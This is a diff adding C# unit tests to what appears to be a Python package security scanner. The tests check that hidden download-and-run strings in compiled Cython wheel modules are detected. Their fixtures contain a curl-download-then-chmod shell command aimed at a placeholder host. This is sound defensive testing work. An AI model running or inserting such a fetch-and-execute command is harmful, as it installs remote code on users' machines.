@@ -633,6 +633,45 @@ public sealed class PackageReviewTests : IDisposable
         Assert.EndsWith("runs without asking: tool_hook.pth imports tool.core", f.Detail);
     }
 
+    // ELF magic, Cython name prefixes, padding, then the string table.
+    private static byte[] CythonModule(byte[] table) =>
+        [0x7F, (byte)'E', (byte)'L', (byte)'F', .. U("__pyx_module_exec\0__pyx_string_tab\0"), .. new byte[16], .. table];
+
+    private static byte[] Deflated(string text)
+    {
+        var ms = new MemoryStream();
+        using (var z = new ZLibStream(ms, CompressionLevel.Optimal)) z.Write(U(text));
+        return ms.ToArray();
+    }
+
+    [Fact]
+    public void A_cython_string_table_is_inflated_and_its_strings_go_through_the_code_rules()
+    {
+        var table = Deflated("__name____test__#!/bin/sh\ncurl -sLo /tmp/a https://h.example.invalid/a &&chmod +x /tmp/a");
+        var r = Review(Zip("tool-1.0-cp311-cp311-linux_x86_64.whl", Wheel(("tool/__init__.py", U("")), ("tool/m.cpython-311-x86_64-linux-gnu.so", CythonModule(table)))));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/download-and-run", Level: "noteworthy", Path: "tool/m.cpython-311-x86_64-linux-gnu.so" });
+        Assert.DoesNotContain(r.Notes, n => n.Contains("Cython", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void An_ordinary_cython_string_table_has_no_noteworthy_finding()
+    {
+        var table = Deflated("__name____test__subprocessPopencheck_outputurllib.requesturlopenwhoamigetpass"
+            + "chmodcurl https://data.example.invalid/set.tar.gz -o set.tar.gzdownload the data set firstosenviron");
+        var r = Review(Zip("tool-1.0-cp311-cp311-linux_x86_64.whl", Wheel(("tool/__init__.py", U("")), ("tool/m.cpython-311-x86_64-linux-gnu.so", CythonModule(table)))));
+        Assert.DoesNotContain(r.Notes, n => n.Contains("Cython", StringComparison.Ordinal));
+        Assert.DoesNotContain(r.Findings, f => f is { Level: "noteworthy", Path: "tool/m.cpython-311-x86_64-linux-gnu.so" });
+    }
+
+    [Fact]
+    public void A_cython_extension_whose_table_does_not_decode_is_named_partial()
+    {
+        var plain = U("__name__ curl -sLo /tmp/a https://h.example.invalid/a &&chmod +x /tmp/a");
+        var r = Review(Zip("tool-1.0-cp311-cp311-linux_x86_64.whl", Wheel(("tool/__init__.py", U("")), ("tool/m.cpython-311-x86_64-linux-gnu.so", CythonModule(plain)))));
+        Assert.DoesNotContain(r.Findings, f => f.Rule == "package/download-and-run");
+        Assert.Contains(r.Notes, n => n.StartsWith("partial: 1 Cython extension(s) with no decoded string table", StringComparison.Ordinal));
+    }
+
     [Fact]
     public void An_sdist_whose_setup_py_imports_a_compiled_only_module_is_noteworthy()
     {
